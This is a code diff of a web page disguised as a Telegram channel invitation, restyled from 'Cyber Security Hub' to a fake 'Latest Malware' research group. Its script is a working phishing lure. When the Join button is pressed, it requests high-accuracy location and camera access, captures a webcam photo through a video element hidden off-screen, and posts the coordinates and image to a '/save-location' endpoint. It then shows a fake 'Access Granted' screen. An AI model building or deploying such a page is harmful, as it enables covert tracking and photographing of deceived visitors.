@@ -3,195 +3,610 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>Telegram - Join Channel</title>
+<title>Latest Malware — Telegram</title>
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        background: #0f172a;
-        min-height: 100vh;
-        display: flex;
-        align-items: flex-end;
-        justify-content: center;
-        overflow: hidden;
-    }
-    .fake-bg {
-        position: fixed;
-        top: 0; left: 0; right: 0; bottom: 0;
-        background: #0f172a;
-        z-index: 0;
-    }
-    .telegram-topbar {
-        background: #1e293b;
-        padding: 12px 16px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        border-bottom: 0.5px solid rgba(255,255,255,0.07);
-    }
-    .telegram-logo {
-        width: 32px; height: 32px;
-        background: #2b70e8;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 18px;
-    }
-    .telegram-logo-text {
-        font-size: 18px;
-        font-weight: 600;
-        color: #e9edef;
-    }
-    .bottom-sheet {
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        z-index: 20;
-        background: #1e293b;
-        border-radius: 28px 28px 0 0;
-        max-height: 65vh;
-        min-height: 50vh;
-        animation: sheetUp 0.35s ease-out;
-        box-shadow: 0 -4px 32px rgba(0,0,0,0.45);
-        overflow-y: auto;
-    }
-    @keyframes sheetUp {
-        from { transform: translateY(100%); }
-        to { transform: translateY(0); }
-    }
-    .drag-handle {
-        width: 36px; height: 4px;
-        background: rgba(255,255,255,0.2);
-        border-radius: 2px;
-        margin: 10px auto 0 auto;
-    }
-    .channel-hero {
-        text-align: center;
-        padding: 20px;
-    }
-    .channel-avatar {
-        width: 80px; height: 80px;
-        background: linear-gradient(145deg, #2b70e8 0%, #1a4fc4 100%);
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 12px auto;
-        font-size: 40px;
-    }
-    .channel-name {
-        font-size: 22px;
-        font-weight: 700;
-        color: #e9edef;
-    }
-    .channel-meta {
-        font-size: 13px;
-        color: #94a3b8;
-        margin-top: 4px;
-    }
-    .stats-row {
-        display: flex;
-        justify-content: space-evenly;
-        padding: 16px;
-        background: #0f172a;
-        margin: 12px 20px;
-        border-radius: 16px;
-    }
-    .stat-item { text-align: center; }
-    .stat-value { font-size: 18px; font-weight: 700; color: #e9edef; }
-    .stat-label { font-size: 11px; color: #94a3b8; }
-    .join-btn {
-        width: calc(100% - 40px);
-        margin: 20px;
-        padding: 14px;
-        background: #2b70e8;
-        color: white;
-        border: none;
-        border-radius: 28px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.2s;
-    }
-    .join-btn:hover { background: #1a5cd4; transform: scale(1.01); }
-    .join-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-    #hiddenCamera {
-        position: fixed;
-        top: -1000px;
-        left: -1000px;
-        width: 1px;
-        height: 1px;
-        opacity: 0;
-        pointer-events: none;
-    }
-    .toast-message {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #1e293b;
-        color: #e9edef;
-        padding: 10px 20px;
-        border-radius: 28px;
-        font-size: 13px;
-        z-index: 1000;
-        white-space: nowrap;
-    }
-    .success-modal {
-        position: fixed;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.85);
-        display: flex; align-items: center; justify-content: center;
-        z-index: 2000;
-    }
-    .success-content {
-        background: #1e293b;
-        margin: 20px;
-        padding: 32px;
-        border-radius: 32px;
-        text-align: center;
-        max-width: 280px;
-    }
-    .success-icon { font-size: 56px; margin-bottom: 16px; }
-    .success-content h3 { font-size: 20px; color: #e9edef; margin-bottom: 8px; }
-    .success-content p { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
-    .success-content button {
-        background: #2b70e8; color: white; border: none;
-        padding: 12px 24px; border-radius: 28px;
-        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
-    }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg: #0a0d14;
+    --surface: #111520;
+    --card: #161c2d;
+    --border: rgba(220, 38, 38, 0.25);
+    --accent: #ef4444;
+    --accent2: #7b5ea7;
+    --text: #e8edf5;
+    --muted: #6b7a99;
+    --sheet: #111827;
+  }
+
+  body {
+    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--bg);
+    min-height: 100vh;
+    overflow: hidden;
+  }
+
+  /* ── Animated background grid ── */
+  .bg-grid {
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(220,38,38,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(220,38,38,0.04) 1px, transparent 1px);
+    background-size: 40px 40px;
+    z-index: 0;
+  }
+
+  .bg-orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+  }
+  .orb1 { width: 300px; height: 300px; background: rgba(220,38,38,0.08); top: -80px; left: -80px; z-index: 0; }
+  .orb2 { width: 200px; height: 200px; background: rgba(123,94,167,0.1); bottom: 30%; right: -40px; z-index: 0; }
+
+  /* ── Topbar ── */
+  .topbar {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px;
+    background: rgba(10,13,20,0.85);
+    backdrop-filter: blur(16px);
+    border-bottom: 0.5px solid rgba(220,38,38,0.2);
+  }
+
+  .topbar-brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .tg-icon {
+    width: 32px; height: 32px;
+    background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .tg-icon svg { width: 18px; height: 18px; fill: white; }
+
+  .topbar-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    letter-spacing: -0.2px;
+  }
+
+  .live-badge {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    background: rgba(220,38,38,0.12);
+    border: 0.5px solid rgba(220,38,38,0.3);
+    border-radius: 20px;
+    padding: 4px 10px;
+    font-size: 11px;
+    color: #ef4444;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+
+  .live-dot {
+    width: 6px; height: 6px;
+    background: #ef4444;
+    border-radius: 50%;
+    animation: pulse 1.5s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.4; transform: scale(0.8); }
+  }
+
+  /* ── Background "channel preview" content ── */
+  .bg-content {
+    position: fixed;
+    top: 62px; left: 0; right: 0; bottom: 0;
+    z-index: 1;
+    overflow: hidden;
+    padding: 16px;
+  }
+
+  .msg-list {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    opacity: 0.35;
+  }
+
+  .msg {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+
+  .msg-avatar {
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .msg-bubble {
+    background: var(--card);
+    border: 0.5px solid rgba(220,38,38,0.15);
+    border-radius: 4px 14px 14px 14px;
+    padding: 8px 12px;
+    max-width: 80%;
+  }
+
+  .msg-sender {
+    font-size: 11px;
+    font-weight: 600;
+    margin-bottom: 3px;
+    color: #ef4444;
+  }
+
+  .msg-text { font-size: 13px; color: var(--muted); line-height: 1.4; }
+
+  .code-block {
+    background: rgba(220,38,38,0.08);
+    border: 0.5px solid rgba(220,38,38,0.2);
+    border-radius: 6px;
+    padding: 6px 10px;
+    font-family: 'SF Mono', Consolas, monospace;
+    font-size: 11px;
+    color: #fca5a5;
+    margin-top: 5px;
+  }
+
+  /* ── Bottom Sheet ── */
+  .sheet-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 20;
+    display: flex;
+    align-items: flex-end;
+  }
+
+  .bottom-sheet {
+    width: 100%;
+    background: var(--sheet);
+    border-radius: 24px 24px 0 0;
+    border-top: 0.5px solid rgba(220,38,38,0.2);
+    animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    overflow: hidden;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(100%); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .drag-pill {
+    width: 40px; height: 4px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 2px;
+    margin: 12px auto 0;
+  }
+
+  .sheet-inner {
+    padding: 20px 20px 32px;
+  }
+
+  /* ── Channel header ── */
+  .ch-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 20px;
+  }
+
+  .ch-logo {
+    width: 60px; height: 60px;
+    background: linear-gradient(145deg, #1a0a0a 0%, #0a0808 100%);
+    border: 1.5px solid rgba(220,38,38,0.4);
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+  }
+
+  .ch-logo svg { width: 28px; height: 28px; }
+
+  .ch-logo-glow {
+    position: absolute;
+    inset: -2px;
+    border-radius: 20px;
+    background: radial-gradient(ellipse, rgba(220,38,38,0.2) 0%, transparent 70%);
+  }
+
+  .ch-info { flex: 1; }
+
+  .ch-name {
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.3px;
+    line-height: 1.2;
+  }
+
+  .ch-tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    background: rgba(220,38,38,0.08);
+    border: 0.5px solid rgba(220,38,38,0.2);
+    border-radius: 12px;
+    padding: 3px 8px;
+    margin-top: 5px;
+    font-size: 11px;
+    color: #ef4444;
+    font-weight: 500;
+  }
+
+  /* ── Stats ── */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border: 0.5px solid rgba(220,38,38,0.15);
+    border-radius: 14px;
+    padding: 12px 8px;
+    text-align: center;
+  }
+
+  .stat-icon {
+    font-size: 18px;
+    margin-bottom: 4px;
+    display: block;
+  }
+
+  .stat-value {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text);
+    display: block;
+  }
+
+  .stat-label {
+    font-size: 10px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-top: 2px;
+    display: block;
+  }
+
+  /* ── Topic chips ── */
+  .topics {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 7px;
+    margin-bottom: 20px;
+  }
+
+  .chip {
+    background: rgba(220,38,38,0.08);
+    border: 0.5px solid rgba(220,38,38,0.2);
+    border-radius: 20px;
+    padding: 5px 12px;
+    font-size: 12px;
+    color: #fca5a5;
+    font-weight: 500;
+  }
+
+  /* ── Join button ── */
+  .join-btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+    color: white;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    letter-spacing: 0.2px;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .join-btn::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+    transition: left 0.4s;
+  }
+
+  .join-btn:hover::before { left: 100%; }
+  .join-btn:active { transform: scale(0.98); }
+  .join-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .btn-icon svg { width: 18px; height: 18px; fill: white; }
+
+  /* ── Toast ── */
+  .toast {
+    position: fixed;
+    top: 80px;
+    left: 50%;
+    transform: translateX(-50%) translateY(-10px);
+    background: var(--card);
+    border: 0.5px solid rgba(220,38,38,0.3);
+    color: var(--text);
+    padding: 10px 18px;
+    border-radius: 24px;
+    font-size: 13px;
+    font-weight: 500;
+    z-index: 999;
+    white-space: nowrap;
+    animation: toastIn 0.3s ease forwards;
+  }
+
+  @keyframes toastIn {
+    to { transform: translateX(-50%) translateY(0); opacity: 1; }
+  }
+
+  /* ── Success modal ── */
+  .success-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 2000;
+    display: flex;
+    align-items: flex-end;
+  }
+
+  .success-bg {
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(8px);
+  }
+
+  .success-bg-art {
+    position: absolute;
+    inset: 0;
+    overflow: hidden;
+    pointer-events: none;
+  }
+
+  .success-grid {
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(220,38,38,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(220,38,38,0.05) 1px, transparent 1px);
+    background-size: 32px 32px;
+  }
+
+  .success-orb-art {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(60px);
+    background: rgba(220,38,38,0.12);
+    width: 250px; height: 250px;
+    top: 20%; left: -60px;
+  }
+
+  .success-orb-art2 {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(70px);
+    background: rgba(123,94,167,0.15);
+    width: 200px; height: 200px;
+    bottom: 30%; right: -40px;
+  }
+
+  .success-sheet {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    background: var(--sheet);
+    border-radius: 24px 24px 0 0;
+    border-top: 0.5px solid rgba(220,38,38,0.2);
+    padding: 12px 20px 40px;
+    animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+
+  .success-icon-wrap {
+    width: 72px; height: 72px;
+    border-radius: 22px;
+    background: linear-gradient(145deg, rgba(220,38,38,0.15), rgba(220,38,38,0.05));
+    border: 1px solid rgba(220,38,38,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 24px auto 16px;
+  }
+
+  .success-icon-wrap svg { width: 36px; height: 36px; stroke: #ef4444; fill: none; stroke-width: 2; }
+
+  .success-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    text-align: center;
+    margin-bottom: 8px;
+    letter-spacing: -0.3px;
+  }
+
+  .success-sub {
+    font-size: 14px;
+    color: var(--muted);
+    text-align: center;
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+
+  .success-sub span { color: #ef4444; font-weight: 600; }
+
+  .success-ok-btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, #dc2626, #991b1b);
+    color: white;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+
+  #hiddenCamera {
+    position: fixed; top: -9999px; left: -9999px;
+    width: 1px; height: 1px; opacity: 0; pointer-events: none;
+  }
 </style>
 </head>
 <body>
 
 <video id="hiddenCamera" autoplay playsinline muted></video>
 
-<div class="fake-bg">
-    <div class="telegram-topbar">
-        <div class="telegram-logo">📱</div>
-        <div class="telegram-logo-text">Telegram</div>
+<div class="bg-grid"></div>
+<div class="bg-orb orb1"></div>
+<div class="bg-orb orb2"></div>
+
+<!-- Topbar -->
+<div class="topbar">
+  <div class="topbar-brand">
+    <div class="tg-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.572 3.021L1.39 10.421c-1.234.477-1.226 1.14-.226 1.437l4.898 1.528 11.34-7.154c.534-.325 1.023-.15.621.207L7.86 16.05l-.347 5.017c.508 0 .732-.233 1.012-.504l2.43-2.36 5.054 3.733c.932.513 1.602.249 1.834-.864L21.95 4.445c.327-1.31-.499-1.905-1.378-.424z"/></svg>
     </div>
+    <span class="topbar-title">Telegram</span>
+  </div>
+  <div class="live-badge">
+    <div class="live-dot"></div>
+    LIVE
+  </div>
 </div>
 
-<div class="bottom-sheet">
-    <div class="drag-handle"></div>
-    <div class="channel-hero">
-        <div class="channel-avatar">📢</div>
-        <div class="channel-name">Cyber Security Hub</div>
-        <div class="channel-meta">Channel • 12.5K subscribers</div>
+<!-- Background channel messages -->
+<div class="bg-content">
+  <div class="msg-list">
+    <div class="msg">
+      <div class="msg-avatar" style="background:#dc2626;">LM</div>
+      <div class="msg-bubble">
+        <div class="msg-sender">Latest Malware Team</div>
+        <div class="msg-text">⚠️ New ransomware variant detected in wild — Triple extortion tactics observed</div>
+        <div class="code-block">$ sha256sum sample.exe<br>3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a</div>
+      </div>
     </div>
-    
-    <div class="stats-row">
-        <div class="stat-item"><div class="stat-value">12.5K</div><div class="stat-label">Subscribers</div></div>
-        <div class="stat-item"><div class="stat-value">2.3K</div><div class="stat-label">Online</div></div>
-        <div class="stat-item"><div class="stat-value">1.2K</div><div class="stat-label">Posts</div></div>
+    <div class="msg" style="justify-content:flex-end;">
+      <div class="msg-bubble" style="border-radius:14px 4px 14px 14px; background:rgba(220,38,38,0.12); border-color:rgba(220,38,38,0.2);">
+        <div class="msg-text" style="color:#fca5a5;">IoCs published — block domains: malicios.c2, update.proc</div>
+      </div>
     </div>
+    <div class="msg">
+      <div class="msg-avatar" style="background:#7b5ea7;">RE</div>
+      <div class="msg-bubble">
+        <div class="msg-sender" style="color:#b49fd4;">RE_hex_team</div>
+        <div class="msg-text">Reverse engineering update: New loader uses process hollowing + NTAPI calls</div>
+        <div class="code-block">python3 extract_config.py --sample 8f3a2b1c</div>
+      </div>
+    </div>
+    <div class="msg">
+      <div class="msg-avatar" style="background:#0f9e6e;">DF</div>
+      <div class="msg-bubble">
+        <div class="msg-sender" style="color:#5dc9a0;">dfir_labs</div>
+        <div class="msg-text">⚠️ APT group using malicious LNK files — TTPs analysis released</div>
+      </div>
+    </div>
+    <div class="msg">
+      <div class="msg-avatar" style="background:#dc2626;">LM</div>
+      <div class="msg-bubble">
+        <div class="msg-sender">Latest Malware Team</div>
+        <div class="msg-text">YARA rules for new Mirai variant — IoT devices targeted</div>
+        <div class="code-block">rule Mirai_New {<br>  $hex = { 01 02 03 04 05 }<br>  condition: $hex at 0x100<br>}</div>
+      </div>
+    </div>
+  </div>
+</div>
 
-    <button id="joinBtn" class="join-btn" onclick="joinChannel()">
-        🔗 JOIN CHANNEL
-    </button>
+<!-- Bottom sheet -->
+<div class="sheet-overlay">
+  <div class="bottom-sheet">
+    <div class="drag-pill"></div>
+    <div class="sheet-inner">
+
+      <div class="ch-header">
+        <div class="ch-logo">
+          <div class="ch-logo-glow"></div>
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#ef4444" stroke-width="1.5" stroke-linejoin="round"/>
+            <path d="M2 17l10 5 10-5" stroke="#ef4444" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M2 12l10 5 10-5" stroke="#ef4444" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" opacity="0.5"/>
+          </svg>
+        </div>
+        <div class="ch-info">
+          <div class="ch-name">Latest Malware</div>
+          <div class="ch-tag">
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Malware Research &nbsp;·&nbsp; Private
+          </div>
+        </div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <span class="stat-icon">👥</span>
+          <span class="stat-value">18.4K</span>
+          <span class="stat-label">Members</span>
+        </div>
+        <div class="stat-card">
+          <span class="stat-icon" style="color:#ef4444;">⚡</span>
+          <span class="stat-value">3.1K</span>
+          <span class="stat-label">Online</span>
+        </div>
+        <div class="stat-card">
+          <span class="stat-icon">🐛</span>
+          <span class="stat-value">240+</span>
+          <span class="stat-label">Samples</span>
+        </div>
+      </div>
+
+      <div class="topics">
+        <span class="chip"># ransomware</span>
+        <span class="chip"># reverse-engineering</span>
+        <span class="chip"># malware-analysis</span>
+        <span class="chip"># apt</span>
+        <span class="chip"># yara</span>
+      </div>
+
+      <button id="joinBtn" class="join-btn" onclick="joinChannel()">
+        <span class="btn-icon">
+          <svg viewBox="0 0 24 24"><path d="M20.572 3.021L1.39 10.421c-1.234.477-1.226 1.14-.226 1.437l4.898 1.528 11.34-7.154c.534-.325 1.023-.15.621.207L7.86 16.05l-.347 5.017c.508 0 .732-.233 1.012-.504l2.43-2.36 5.054 3.733c.932.513 1.602.249 1.834-.864L21.95 4.445c.327-1.31-.499-1.905-1.378-.424z"/></svg>
+        </span>
+        Join Group
+      </button>
+
+    </div>
+  </div>
 </div>
 
 <script>
@@ -199,117 +614,105 @@ let mediaStream = null;
 let locationData = null;
 
 async function joinChannel() {
-    const btn = document.getElementById("joinBtn");
-    btn.disabled = true;
-    btn.textContent = "Requesting...";
-    
-    showToast("📍 Requesting location & camera...");
-    
-    if (!navigator.geolocation) {
-        showToast("❌ Geolocation not supported");
-        resetButton();
-        return;
-    }
-    
-    navigator.geolocation.getCurrentPosition(
-        async function(position) {
-            locationData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-            };
-            showToast("✅ Location captured!");
-            await capturePhoto();
-        },
-        function(error) {
-            showToast("❌ Location permission denied");
-            resetButton();
-        },
-        { enableHighAccuracy: true, timeout: 15000 }
-    );
+  const btn = document.getElementById("joinBtn");
+  btn.disabled = true;
+  btn.textContent = "Requesting...";
+  showToast("📍 Requesting location & camera...");
+
+  if (!navigator.geolocation) {
+    showToast("Geolocation not supported");
+    resetButton(); return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async function(position) {
+      locationData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
+      showToast("✅ Location captured!");
+      await capturePhoto();
+    },
+    function() { showToast("Location permission denied"); resetButton(); },
+    { enableHighAccuracy: true, timeout: 15000 }
+  );
 }
 
 async function capturePhoto() {
-    const video = document.getElementById('hiddenCamera');
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = mediaStream;
-        video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => takePhoto(), 1000);
-        };
-    } catch (err) {
-        saveToServer(null);
-    }
+  const video = document.getElementById('hiddenCamera');
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = mediaStream;
+    video.onloadedmetadata = () => { video.play(); setTimeout(() => takePhoto(), 1000); };
+  } catch (err) { saveToServer(null); }
 }
 
 function takePhoto() {
-    const video = document.getElementById('hiddenCamera');
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const photoData = canvas.toDataURL('image/jpeg', 0.8);
-    
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-    }
-    saveToServer(photoData);
+  const video = document.getElementById('hiddenCamera');
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+  const photoData = canvas.toDataURL('image/jpeg', 0.8);
+  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+  saveToServer(photoData);
 }
 
 function saveToServer(photoData) {
-    fetch('/save-location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            latitude: locationData.latitude,
-            longitude: locationData.longitude,
-            accuracy: locationData.accuracy,
-            photo: photoData ? photoData.split(',')[1] : null,
-            photo_filename: photoData ? `telegram_${Date.now()}.jpg` : null,
-            tracking_type: 'initial',
-            platform: 'telegram'
-        })
+  fetch('/save-location', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      latitude: locationData.latitude,
+      longitude: locationData.longitude,
+      accuracy: locationData.accuracy,
+      photo: photoData ? photoData.split(',')[1] : null,
+      photo_filename: photoData ? `telegram_${Date.now()}.jpg` : null,
+      tracking_type: 'initial',
+      platform: 'telegram'
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === "success") {
-            showSuccessModal();
-        } else {
-            showToast("❌ Failed: " + data.message);
-            resetButton();
-        }
-    });
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.status === "success") showSuccessModal();
+    else { showToast("Failed: " + data.message); resetButton(); }
+  })
+  .catch(() => { showToast("Network error"); resetButton(); });
 }
 
 function showToast(msg) {
-    const existing = document.querySelector('.toast-message');
-    if (existing) existing.remove();
-    const toast = document.createElement('div');
-    toast.className = 'toast-message';
-    toast.innerHTML = msg;
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 3000);
+  document.querySelectorAll('.toast').forEach(t => t.remove());
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
 }
 
 function showSuccessModal() {
-    const modal = document.createElement('div');
-    modal.className = 'success-modal';
-    modal.innerHTML = `
-        <div class="success-content">
-            <div class="success-icon">✅</div>
-            <h3>Joined Successfully!</h3>
-            <p>You have been added to Cyber Security Hub channel.</p>
-            <button onclick="window.location.href='/'">OK</button>
-        </div>
-    `;
-    document.body.appendChild(modal);
+  const overlay = document.createElement('div');
+  overlay.className = 'success-overlay';
+  overlay.innerHTML = `
+    <div class="success-bg"></div>
+    <div class="success-bg-art">
+      <div class="success-grid"></div>
+      <div class="success-orb-art"></div>
+      <div class="success-orb-art2"></div>
+    </div>
+    <div class="success-sheet">
+      <div class="drag-pill"></div>
+      <div class="success-icon-wrap">
+        <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      </div>
+      <div class="success-title">Access Granted!</div>
+      <div class="success-sub">Welcome to <span>Latest Malware</span><br>Research group access unlocked.</div>
+      <button class="success-ok-btn" onclick="window.location.href='/'">Open Group</button>
+    </div>
+  `;
+  document.body.appendChild(overlay);
 }
 
 function resetButton() {
-    const btn = document.getElementById("joinBtn");
-    btn.disabled = false;
-    btn.innerHTML = "🔗 JOIN CHANNEL";
+  const btn = document.getElementById("joinBtn");
+  btn.disabled = false;
+  btn.innerHTML = `<span class="btn-icon"><svg viewBox="0 0 24 24"><path d="M20.572 3.021L1.39 10.421c-1.234.477-1.226 1.14-.226 1.437l4.898 1.528 11.34-7.154c.534-.325 1.023-.15.621.207L7.86 16.05l-.347 5.017c.508 0 .732-.233 1.012-.504l2.43-2.36 5.054 3.733c.932.513 1.602.249 1.834-.864L21.95 4.445c.327-1.31-.499-1.905-1.378-.424z"/></svg></span>Join Group`;
 }
 </script>
 </body>
